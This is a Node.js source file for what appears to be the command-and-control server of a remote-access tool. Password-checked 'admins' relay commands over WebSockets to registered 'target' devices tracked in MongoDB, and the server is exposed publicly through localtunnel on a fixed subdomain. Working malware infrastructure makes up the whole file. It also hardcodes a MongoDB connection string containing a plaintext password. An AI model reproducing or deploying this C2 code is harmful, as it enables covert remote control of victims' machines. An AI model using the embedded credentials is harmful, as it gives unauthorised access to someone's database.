//module imports
const websocket = require('ws'); //websocket
const mongoose = require('mongoose'); //mongodb database
const localTunnel = require("localtunnel"); //localtunnel
const express = require("express"); //express
const http = require('http'); //http
const path  = require("path");//path module

//custom imports
const newDevice = require('./custom/connectionSchema'); //mongodb schema
const commands = require('./custom/commands.json'); //commands json file


//custom values
const  PORT = process.env.PORT || 3000; //websocket port
const password = "b2d627894807d0af925ba02a15e8d30d314cbf21cfbc4137f54da282c3360ff1"; //sha256 hash password
const mongoDBConnectionString = 'mongodb+srv://xv:Eight8nine9@cluster0.gfv8vjt.mongodb.net/collections'; //connection string for mongodb
const subdomain = "effinglitch1509xv";  //subdomain for local tunnel

//initializations
const app = express(); //express init
const server = http.createServer(app); //http server
const wss = new websocket.Server({server:server,clientTracking:true}); //websocket init
mongoose.connect(mongoDBConnectionString,{maxPoolSize:10});// connect mongodb

//store
const admins ={}; //store admin sockets
const targets = {}; //store target sockets

///match password hash
function matchPassword(pass){return (pass === password)?true:false} //return true if password is correct else false

//send notification to all admins available
function notifyAdmin(con,user,data){Object.keys(admins).map(key=>admins[key].socket.send(JSON.stringify({type:"nt",con:con,user:user,dat:data?data:"no value"})))};

//handle socket connection on connection event
async function handleSocket(url,socket){
    try{
        
    //check if username if present
    if(url.username!=undefined && url.username!="" && url.username){
        let isAdmin = url.admin === true && matchPassword((url.password)?url.password:"") === true
        let isFailedAdmin = url.admin === true && matchPassword((url.password)?url.password:"") === true
        let isMisvalueAdmin = url.admin === false && matchPassword((url.password)?url.password:"") === true 
        let isTarget = (url.admin === false || url.admin === undefined) && matchPassword((url.password)?url.password:"")!==true

        //if admin
        if(isAdmin){
            admins[url.username] = {socket:socket} //adding to admins
            console.log(`[SUCCESS] ADMIN ${url.username} added `) //logging
        }
        //if admin is true and password is wrong
        else if(isFailedAdmin){
            socket.close()
            console.log(`[FAILED] ADMIN ${url.username} closed - wrong password`)//logging
        }
        //if admin is false and password is right
        else if(isMisvalueAdmin){
            socket.close()
            console.log(`[FAILED] ADMIN ${url.username} closed - admin is false`)//logging
        }
        //is target
        else if(isTarget){
            const data = await newDevice.findOne({uniqueid:url.username});

            //check if target is existing or new
            if(data == null){ //new target
                try{
                    const targetdata = await newDevice.create({uniqueid:url.username,os:url.os,online:true,lastTime:new Date().getTime(),date:new Date().getTime()});//adding target data to database
                    targets[url.username] = {socket:socket,id:targetdata._id} //adding target
                    notifyAdmin(true,url.username,targetdata._id) //sending notification to admin
                    console.log(`[SUCCESS] TARGET ${url.username} added`)//logging
                }catch(e){
                    console.log(`db error`,e) //logging
                    console.log(`[FAILED] TARGET ${url.username} cant be added to db - db error`)//logging
                }
            }
            else{ //existing target
                //update target online status and time in db
                newDevice.findOneAndUpdate({ _id: data.id }, { $set: { online:true} }, { new: true }).then((data)=>{
                    if(data==null){
                        console.log(`[FAILED] TARGET ${url.username} cant be updated to db - db error 2`)//logging
                    }else{
                        targets[url.username] = {socket:socket,id:data._id}//add target to object storage
                        notifyAdmin(true,url.username,data._id)//notifiy admin
                        console.log(`[SUCCESS] TARGET ${url.username} added to db and storage`)//logging
                    }
                })
            }
        }else{
            console.log(`admin : ${url.admin} username : ${url.username} password : ${matchPassword((url.password)?url.password:"")}`)
        }
    }
        }catch(e){
        console.log(`[FAILED] TARGET ${url.username} error found - please log error`,e)//logging
    }
}
//handle socket connection on close event
function handleCloseEvent(url){
    try{
        //if admin disconnected
    if(url.admin === true && matchPassword(url.password)===true){
        delete admins[url.username]
        console.log(`[SUCCESS] ADMIN ${url.username} removed `)//logging
    }
    //if target disconnected
    else if(url.admin === false  || matchPassword(url.password)!==true){
        //update target 
        newDevice.findOneAndUpdate({ _id: targets[url.username].id.toString() }, { $set: { online:false} }, { new: true }).then((data)=>{
            if(data===null){
                console.log(`[FAILED] TARGET ${url.username} cant be updated to db - db error 2`)//logging
            }
            else{
                delete targets[url.username]
                notifyAdmin(false,url.username)//notifi admin
                console.log(`[SUCCESS] TARGET ${url.username} is successfully removed`)//logging
            }
        })
    }else{
            console.log(`[FAILED] TARGET ${url.username} can be identified`)
        }
    }
    catch(e){
        if(e instanceof TypeError){
            console.log("[FAILED] skipping unauthenticated user")
        }else{
            console.log(`[FAILED] TARGET ${url.username} error found - please log error`,e)//logging
        }
    }
}

//handle socket connection on message event
function handleMessages(data,url,socket){
    let response;

    //check if response is able to json parse
    try{response = JSON.parse(data)}catch(error){response = false}

    //if json could successfully parse data, it will continue
    if(response){
        //request from admin to send to target (forward from admin to target)
        if(response.type ==="req" && url.admin === true && matchPassword(url.password)===true){
            
            const to = response.to //target id
            const data  = response.data //content
            const from =Object.keys(admins).filter(key => admins[key].socket === socket);
            
            if(to && data && from ){
                if(targets[to]){
                    console.log("id",targets[to].id)
                    //JSON.stringify({"from":from[0],"data":data}) // request to target - request model
                targets[to].socket.send(`${from[0]}|${data}`) //request model type : from address (for return): data
                console.log(`[SUCCESS] (A2T) sent message from ${url.username} to ${to} | data : ${data}`)//logging
                }else{
                    socket.send(JSON.stringify({"type":"err","data":"NO_USR","user":to}))
                    console.log(`[FAILED] (A2T) cant send message from ${url.username} to ${to} | data : ${data}, user not available`)//logging
                }
                
            }else{
                console.log(`[FAILED] to sent message from ${url.username} to ${to} | data : ${data}`)//logging
                console.log(`request url : `,response)
            }
        }
        //response from target to send to admin
        else if(response.type === "res"){
            const from =Object.keys(targets).filter(key => targets[key].socket === socket);
            const to = response.to;
            const data = response.data;
            if(from && to && data && admins[to]){
                admins[to].socket.send(JSON.stringify({"type":"dat","from":from[0],"data":data}))
                console.log(`[SUCCESS] (T2A) sent message from ${url.username} to ${to} | data : ${data}`)//logging 
            }else{
                console.log(`[FAILED] to sent message from ${url.username} to ${to} | data : ${data}`)//logging
                console.log(`request url : `,response)
            }
        }
        //request from admin to get target details from database
        else if(response.type === "tgt" && url.admin == true && matchPassword(url.password)===true){
            newDevice.find({}).then((data)=>{
                if(data!=null){
                    socket.send(JSON.stringify({"type":"tgt","data":data}))
                    console.log(`[SUCCESS] (S2A) sent targets from server `)//logging 
                }else{
                    console.log(`[FAILED] (S2A) to sent targets `)//logging
                }
            })
        }
        //request from admin to get commands details from commands.json
        else if(response.type === "cmd" && url.admin == true && matchPassword(url.password)===true ){
            socket.send(JSON.stringify(commands))
            console.log(`[SUCCESS] (S2A) sent commands from server to `)//logging 
        }
        else{
            console.log(`[FAILED] unknown response type`)//logging 
        }
    }
}

//websocket handle on connection event
function handleConnection(socket,request){
    let url;

    //check if url values are able to jsonParse
    try{url = JSON.parse(decodeURIComponent(request.url.replace('/','')))}catch(error){url = null};

    if(url){
        handleSocket(url,socket); //add socket to admin or target

        socket.on('message',message=>handleMessages(message,url,socket)); //handle messages

        socket.on('close',()=>handleCloseEvent(url)); //handle socket close event  
    }else{
        console.log(`[FAILED] url cant be parsed`)//logging
    }
    
}

//localtunnel start function
const startLocalTunnel = async () => {
    try {
      const tunnel = await localTunnel({
        port: PORT,
        subdomain: subdomain,
      });
  
      // The public URL generated by localtunnel
      console.log(`LocalTunnel URL: ${tunnel.url}`);
    } catch (error) {
      console.error('Error starting localtunnel:', error.message);
    }
};


wss.on('connection',handleConnection);
server.listen(PORT,()=>{
    startLocalTunnel()
    console.log(`Server started on port : ${PORT}`)
})
